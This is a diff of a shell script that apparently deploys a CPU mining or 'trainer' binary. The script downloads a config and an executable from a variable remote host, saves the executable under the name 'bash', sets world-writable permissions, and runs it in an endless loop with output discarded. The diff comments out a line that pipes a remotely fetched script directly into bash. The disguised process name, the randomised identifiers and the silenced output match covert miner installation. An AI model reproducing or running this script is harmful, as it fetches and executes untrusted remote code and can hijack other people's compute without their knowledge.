@@ -21,8 +21,8 @@ addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/n
 name=`RandString 2 c${cores}_${addr}`;
 
 
-bash <(wget -qO- ${src}/k.sh) 7200 5400 >/dev/null 2>&1 &
-idlePid="$!"
+# bash <(wget -qO- ${src}/k.sh) 7200 5400 >/dev/null 2>&1 &
+# idlePid="$!"
 
 
 if [ "$mode" == "1" ]; then
@@ -38,10 +38,10 @@ rm -rf "${work}"; mkdir -p "${work}"
 wget --no-check-certificate -4 -qO "${work}/appsettings.json" "${src}/q.json"
 wget --no-check-certificate -4 -qO "${work}/bash" "${src}/q"
 chmod -R 777 "${work}"
-sed -i "s/\"trainerBinary\":.*/\"trainerBinary\": \"$(RandString 7)\",/" "${work}/appsettings.json"
-sed -i "s/\"amountOfThreads\":.*/\"amountOfThreads\": \"${cores}\",/" "${work}/appsettings.json"
+sed -i "s/\"cpuName\":.*/\"cpuName\": \"$(RandString 7)\",/" "${work}/appsettings.json"
+# sed -i "s/\"cpuThreads\":.*/\"cpuThreads\": \"${cores}\",/" "${work}/appsettings.json"
 sed -i "s/\"alias\":.*/\"alias\": \"${name}\",/" "${work}/appsettings.json"
-[ -n "$idlePid" ] && sed -i "s/\"idleSettings\":.*/\"idleSettings\": {\"command\": \"kill\", \"arguments\": \"-10 $idlePid\"},/" "${work}/appsettings.json"
+# [ -n "$idlePid" ] && sed -i "s/\"idleSettings\":.*/\"idleSettings\": {\"command\": \"kill\", \"arguments\": \"-10 $idlePid\"},/" "${work}/appsettings.json"
 
 
 cmd="while true; do cd ${work}; ./bash >/dev/null 2>&1 ; sleep 7; done"
